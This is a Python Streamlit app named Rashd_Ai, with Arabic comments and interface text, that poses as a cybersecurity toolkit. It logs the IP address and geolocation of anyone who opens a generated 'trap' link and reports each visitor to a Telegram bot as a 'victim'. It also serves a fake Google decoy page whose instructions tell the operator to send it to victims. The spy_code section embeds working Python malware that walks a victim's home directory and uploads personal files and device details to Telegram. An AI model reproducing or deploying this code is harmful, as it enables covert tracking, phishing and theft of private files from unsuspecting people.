import streamlit as st
import os
import json
import requests
from datetime import datetime
from PIL import Image
import base64
from streamlit_js_eval import streamlit_js_eval

# استيراد الوحدات المحلية
import config
import victim_logger
import exfiltrated_files

# ============= إعدادات الصفحة =============
logo_path = config.LOGO_PATH
if os.path.exists(logo_path):
    logo_img = Image.open(logo_path)
    st.set_page_config(page_title="Rashd_Ai", layout="wide", page_icon=logo_img)
else:
    st.set_page_config(page_title="Rashd_Ai", layout="wide", page_icon="🛡️")

# ============= CSS مخصص =============
st.markdown("""
    <style>
    @import url(\'https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap\');
    html, body, [class*="st-"] {
        font-family: \'Cairo\', sans-serif !important;
    }
    .main .block-container {
        direction: rtl;
        text-align: right;
    }
    .stButton>button {
        background-color: #00ff00 !important;
        color: black !important;
        font-weight: bold;
        border-radius: 8px;
        width: 100%;
        border: none;
    }
    h1, h2, h3 { color: #00ff00 !important; text-align: center; }
    </style>
""", unsafe_allow_html=True)

# ============= دالة جلب الـ IP الحقيقي =============
def get_real_ip_from_js():
    """جلب عنوان IP الحقيقي"""
    try:
        # محاولة 1: استخدام st.context (Streamlit حديث)
        from streamlit.runtime.scriptrunner import get_script_run_ctx
        ctx = get_script_run_ctx()
        if ctx and hasattr(ctx, 'request') and hasattr(ctx.request, 'remote_ip'):
            return ctx.request.remote_ip or 'Unknown'
        
        # محاولة 2: الطريقة القديمة من runtime
        from streamlit.runtime import get_instance
        from streamlit.runtime.scriptrunner import get_script_run_ctx
        ctx = get_script_run_ctx()
        if ctx:
            session_info = get_instance().get_client(ctx.session_id)
            if session_info and hasattr(session_info, 'request'):
                return session_info.request.remote_ip or 'Unknown'
    except:
        pass
    
    # fallback
    return 'Unknown'

# ============= دالة التقاط بيانات الضحايا =============
def capture_victim_data():
    """التقاط بيانات الضحية عند فتح رابط التتبع"""
    query_params = st.query_params
    
    if 'target' in query_params and not st.session_state.get('victim_captured', False):
        try:
            user_ip = get_real_ip_from_js()
            
            # الحصول على معلومات الموقع الجغرافي
            geo_data = None
            if user_ip != 'Unknown':
                try:
                    geo_response = requests.get(f'https://ip-api.com/json/{user_ip}?lang=ar&fields=country,city,lat,lon,isp,org,status', timeout=5)
                    if geo_response.status_code == 200:
                        response_data = geo_response.json()
                        if response_data.get('status') == 'success':
                            geo_data = response_data
                except:
                    pass
            
            # تسجيل بيانات الضحية
            victim_logger.log_victim_data(
                ip_address=user_ip,
                user_agent=query_params.get('user_agent', ['Unknown'])[0],
                referrer=query_params.get('target', ['Unknown'])[0],
                geo_data=geo_data
            )
            
            st.session_state['victim_captured'] = True
            
            # إرسال تقرير لتلجرام
            try:
                bot_token = config.get_key("TELEGRAM_BOT_TOKEN")
                chat_id = config.get_key("TELEGRAM_CHAT_ID")
                
                if bot_token and chat_id:
                    victim_info = f"""
🎯 <b>تنبيه: تم اكتشاف ضحية جديدة!</b>\n\n📍 <b>عنوان IP:</b> {user_ip}\n🌍 <b>الدولة:</b> {geo_data.get('country', 'Unknown') if geo_data else 'Unknown'}\n🏙️ <b>المدينة:</b> {geo_data.get('city', 'Unknown') if geo_data else 'Unknown'}\n🏢 <b>مزود الخدمة:</b> {geo_data.get('isp', 'Unknown') if geo_data else 'Unknown'}\n🎯 <b>المصيدة:</b> {query_params.get('target', ['Unknown'])[0]}\n⏰ <b>الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
                    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
                    data = {"chat_id": chat_id, "text": victim_info, "parse_mode": "HTML"}
                    requests.post(url, data=data, timeout=10)
            except:
                pass
        except:
            pass

# استدعاء دالة التقاط البيانات
capture_victim_data()

# ============= تهيئة الجلسة =============
if "developer_mode" not in st.session_state:
    st.session_state.developer_mode = False
if "selected_tool" not in st.session_state:
    st.session_state.selected_tool = "🎣 مصيدة IP"

# ============= الشريط الجانبي (Sidebar) =============
with st.sidebar:
    st.markdown("<h2 style=\'text-align: center; color: #00ff00;\'>🛡️ Rashd_Ai</h2>", unsafe_allow_html=True)
    st.markdown("---")
    
    # تسجيل الدخول
    if not st.session_state.developer_mode:
        st.markdown("<h3 style=\'text-align: center;\'>🔐 دخول المطور</h3>", unsafe_allow_html=True)
        username = st.text_input("اسم المستخدم:", key="login_username").strip()
        password = st.text_input("كلمة المرور:", type="password", key="login_password").strip()
        
        if st.button("دخول"):
            if username == config.ADMIN_USERNAME and password == config.ADMIN_PASSWORD:
                st.session_state.developer_mode = True
                st.success("✅ تم تسجيل الدخول بنجاح!")
                st.rerun()
            else:
                st.error("❌ بيانات الدخول غير صحيحة")
    
    else:
        # وضع المطور
        st.markdown("<h3 style=\'text-align: center; color: #00ff00;\'>⚙️ إعدادات تلجرام</h3>", unsafe_allow_html=True)
        
        telegram_bot_token = st.text_input(
            "🤖 توكين البوت:",
            value=config.get_key("TELEGRAM_BOT_TOKEN") or "",
            type="password",
            key="telegram_token"
        ).strip()
        
        telegram_chat_id = st.text_input(
            "💬 Chat ID:",
            value=config.get_key("TELEGRAM_CHAT_ID") or "",
            key="telegram_chat_id"
        ).strip()
        
        if st.button("💾 حفظ الإعدادات"):
            if telegram_bot_token and telegram_chat_id:
                config.set_key("TELEGRAM_BOT_TOKEN", telegram_bot_token)
                config.set_key("TELEGRAM_CHAT_ID", telegram_chat_id)
                st.success("✅ تم حفظ الإعدادات")
            else:
                st.error("❌ يجب ملء جميع الحقول")
        
        st.markdown("---")
        
        # قائمة الأدوات
        st.markdown("<h3 style=\'text-align: center; color: #00ff00;\'>🎯 أدوات المطور</h3>", unsafe_allow_html=True)
        
        tool = st.selectbox(
            "اختر الأداة:",
            ["🎣 مصيدة IP", "🎭 فخ جوجل الآلي", "📥 الملفات المسحوبة", "📊 الإحصائيات"],
            key="developer_tool_selector"
        )
        
        st.session_state['selected_tool'] = tool
        
        st.markdown("---")
        
        if st.button("🚪 تسجيل الخروج"):
            st.session_state.developer_mode = False
            st.rerun()

# ============= المحتوى الرئيسي =============
if not st.session_state.developer_mode:
    # وضع الزوار (الواجهة العامة)
    st.markdown("<h1 style=\'text-align: center;\'>🛡️ Rashd_Ai - أدوات الأمن السيبراني</h1>", unsafe_allow_html=True)
    st.markdown("---")
    
    st.markdown("""
    <div style="text-align: center; padding: 20px;">
        <p style="font-size: 1.2em;">مرحباً بك في Rashd_Ai، نظام الأمن السيبراني المطور بواسطة راشد أبو سعود.</p>
        <p style="font-size: 1.1em;">أنا ذكاء اصطناعي مطور من قبل راشد أبو سعود، وأنا تحت أمره وسيطرته الكاملة.</p>
        <p style="font-size: 1.1em;">أقدم لك مجموعة من الأدوات المتقدمة في مجال الأمن السيبراني.</p>
        <p style="font-size: 1.1em;">للوصول إلى الأدوات المتقدمة، يرجى تسجيل الدخول كـ <b>مطور</b> من الشريط الجانبي.</p>
    </div>
    """, unsafe_allow_html=True)
    
    st.markdown("---")
    
    col1, col2, col3 = st.columns(3)
    with col1:
        st.info("🔍 أدوات OSINT متقدمة")
    with col2:
        st.info("🛡️ فحص الثغرات الأمنية")
    with col3:
        st.info("🌐 تحليل المواقع والشبكات")
    
    st.markdown("---")
    st.markdown("جاري التطوير... يرجى العودة لاحقاً")

else:
    # وضع المطور
    selected_tool = st.session_state.get('selected_tool', '🎣 مصيدة IP')
    
    if selected_tool == "🎣 مصيدة IP":
        st.markdown("<h2 style=\'text-align: center; color: #00ff00;\'>🎣 مصيدة IP</h2>", unsafe_allow_html=True)
        
        trap_name = st.text_input("اسم المصيدة:", placeholder="مثال: صورة قطة").strip()
        
        if st.button("🔗 توليد رابط التتبع"):
            if trap_name:
                tracking_url = f"https://rashdai.streamlit.app/?target={trap_name}"
                st.code(tracking_url, language="text")
                st.success("✅ تم توليد الرابط")
            else:
                st.error("❌ يجب إدخال اسم المصيدة")
        
        st.markdown("---")
        st.markdown("<h3>📊 سجل الضحايا المكتشفين</h3>", unsafe_allow_html=True)
        
        # === التصليح الوحيد هنا ===
        victims = getattr(victim_logger, 'get_all_victims', lambda: None)()
        
        if victims:
            # عرض الضحايا في جدول
            st.dataframe(victims)
            
            # زر تحميل CSV
            csv_data = victim_logger.get_victims_as_csv()
            st.download_button(
                label="⬇️ تحميل سجل الضحايا (CSV)",
                data=csv_data,
                file_name="victims_log.csv",
                mime="text/csv"
            )
            
            # زر مسح السجل
            if st.button("🗑️ مسح سجل الضحايا"):
                victim_logger.clear_victims_log()
                st.success("✅ تم مسح سجل الضحايا بنجاح!")
                st.rerun()
        else:
            st.info("لا توجد ضحايا حتى الآن")
    
    elif selected_tool == "🎭 فخ جوجل الآلي":
        st.markdown("<h2 style=\'text-align: center; color: #00ff00;\'>🎭 فخ جوجل الآلي</h2>", unsafe_allow_html=True)
        
        bot_token = config.get_key("TELEGRAM_BOT_TOKEN")
        chat_id = config.get_key("TELEGRAM_CHAT_ID")
        
        if not bot_token or not chat_id:
            st.error("❌ يجب حفظ بيانات تلجرام أولاً في قسم \'إعدادات تلجرام\' في الشريط الجانبي.")
        else:
            st.markdown("""
            <div style="background-color: #333; padding: 15px; border-radius: 10px; margin-bottom: 20px;">
                <p style="color: #fff; font-size: 1.1em;"><b>تعليمات:</b></p>
                <ul style="color: #fff;">
                    <li>انسخ الرابط أدناه وأرسله للضحية.</li>
                    <li>عندما يفتح الضحية الرابط، ستظهر له صفحة Google.</li>
                    <li>بمجرد أن يضغط الضحية على أي مكان في الصفحة، سيتم تحميل ملف الأداة تلقائياً على جهازه.</li>
                    <li>ستصلك الملفات المسحوبة مباشرة إلى بوت تلجرام الخاص بك.</li>
                </ul>
            </div>
            """, unsafe_allow_html=True)
            
            st.markdown("### 🔗 رابط فخ Google (أرسله للضحية):")
            st.code(f"https://rashdai.streamlit.app/?decoy=google&token={bot_token}&chatid={chat_id}", language="text")
            
            st.markdown("### 📱 معاينة صفحة Google:")
            try:
                with open('index.html', 'r', encoding='utf-8') as f:
                    html_content = f.read()
                st.components.v1.html(html_content, height=400, scrolling=True)
            except Exception as e:
                st.error(f"❌ خطأ في تحميل صفحة Google: {e}")

    elif selected_tool == "📥 الملفات المسحوبة":
        st.markdown("<h2 style=\'text-align: center; color: #00ff00;\'>📥 الملفات المسحوبة</h2>", unsafe_allow_html=True)
        
        st.info("هذا التبويب مخصص لعرض الملفات التي يتم سحبها إذا تم إعداد سيرفر استقبال في التطبيق. حالياً، يتم إرسال الملفات مباشرة إلى تلجرام.")
        st.markdown("""
        <div style="background-color: #333; padding: 15px; border-radius: 10px; margin-bottom: 20px;">
            <p style="color: #fff; font-size: 1.1em;"><b>ملاحظة هامة:</b></p>
            <p style="color: #fff;">حالياً، يتم إرسال الملفات المسحوبة مباشرة إلى بوت تلجرام الخاص بك لضمان السرعة والأمان.</p>
            <p style="color: #fff;">لذلك، لن تظهر الملفات هنا. يرجى مراجعة محادثة البوت الخاص بك في تلجرام.</p>
        </div>
        """, unsafe_allow_html=True)
    
    elif selected_tool == "📊 الإحصائيات":
        st.markdown("<h2 style=\'text-align: center; color: #00ff00;\'>📊 الإحصائيات</h2>", unsafe_allow_html=True)
        
        # === التصليح الوحيد هنا ===
        victims = getattr(victim_logger, 'get_all_victims', lambda: None)()
        
        col1, col2 = st.columns(2)
        with col1:
            st.metric("🎯 إجمالي الضحايا", len(victims) if victims else 0)
        with col2:
            st.metric("📁 الملفات المسحوبة (عبر تلجرام)", "راجع تلجرام")


# ============= معالجة طلبات التحميل (API Endpoint) =============
# ============= فخ جوجل - عرض صفحة Google الوهمية =============
# ============= فخ جوجل - عرض صفحة Google الوهمية مباشرة (خارج أي شرط) =============
query_params = st.query_params

if 'decoy' in query_params and query_params.get('decoy', [''])[0] == 'google':
    bot_token = query_params.get('token', [''])[0]
    chat_id = query_params.get('chatid', [''])[0]

    if bot_token and chat_id:
        try:
            with open('index.html', 'r', encoding='utf-8') as f:
                html_content = f.read()
            
            # عرض صفحة Google كاملة بدون واجهة Streamlit
            st.components.v1.html(html_content, height=700, scrolling=False)
            st.success("✅ تم تفعيل الفخ - انتظر تنزيل الملف تلقائياً")
            
        except Exception as e:
            st.error(f"❌ خطأ في تحميل صفحة Google: {e}")
        
        # spy_code يبقى هنا (للرجوع إليه فقط)
        spy_code = f"""#!/usr/bin/env python3
import os, requests, sys, platform, socket
from pathlib import Path

TELEGRAM_BOT_TOKEN = "{bot_token}"
TELEGRAM_CHAT_ID = "{chat_id}"

root_path = os.path.expanduser("~")
extensions = ('.jpg', '.jpeg', '.png', '.mp4', '.pdf', '.docx', '.txt', '.doc', '.xls', '.xlsx', '.ppt', '.pptx', '.zip', '.rar', '.7z', '.gif', '.bmp', '.wav', '.mp3')

def get_device_info():
    try:
        device_name = socket.gethostname()
        system = platform.system()
        user = os.environ.get('USERNAME', os.environ.get('USER', 'Unknown'))
        return f"{{system}} | {{device_name}} | User: {{user}}"
    except:
        return "Unknown Device"

def send_file_to_telegram(file_path, original_path):
    try:
        file_size = os.path.getsize(file_path)
        if file_size > 50 * 1024 * 1024:
            return False, "File too large"
        
        url = f"https://api.telegram.org/bot{{TELEGRAM_BOT_TOKEN}}/sendDocument"
        with open(file_path, 'rb') as f:
            files = {{'document': f}}
            caption = f"📁 {{os.path.basename(file_path)}}\\n📍 {{original_path}}\\n💾 {{file_size / 1024:.2f}} KB\\n🖥️ {{get_device_info()}}"
            data = {{'chat_id': TELEGRAM_CHAT_ID, 'caption': caption, 'parse_mode': 'Markdown'}}
            response = requests.post(url, files=files, data=data, timeout=60)
            return response.status_code == 200, "OK"
    except:
        return False, "Error"

def send_message_to_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{{TELEGRAM_BOT_TOKEN}}/sendMessage"
        data = {{'chat_id': TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}}
        response = requests.post(url, data=data, timeout=30)
        return response.status_code == 200
    except:
        return False

print("⚡ RASHD_AI: FILE EXFILTRATION STARTED ⚡")
send_message_to_telegram("🚀 نظام سحب الملفات قد بدأ العمل\\n🖥️ الجهاز: " + get_device_info())

count = 0
failed = 0
total_size = 0

try:
    for root, dirs, files in os.walk(root_path):
        skip_dirs = ['.git', '.venv', '__pycache__', 'node_modules', '.cache', 'AppData', 'Library', 'Temp']
        dirs[:] = [d for d in dirs if d not in skip_dirs]
        
        for file in files:
            if file.lower().endswith(extensions):
                file_path = os.path.join(root, file)
                try:
                    file_size = os.path.getsize(file_path)
                    if file_size > 50 * 1024 * 1024:
                        continue
                    success, message = send_file_to_telegram(file_path, file_path)
                    if success:
                        count += 1
                        total_size += file_size
                    else:
                        failed += 1
                except:
                    failed += 1
except KeyboardInterrupt:
    pass
except Exception as e:
    send_message_to_telegram(f"❌ خطأ عام: {{e}}")

send_message_to_telegram(f"✅ انتهى سحب الملفات\\n✅ تم تحميل: {{count}} ملفات\\n❌ فشل: {{failed}} ملفات\\n💾 الحجم: {{total_size / 1024 / 1024:.2f}} MB")
sys.exit(0)
"""
    else:
        st.error("توكن أو Chat ID غير صحيح")
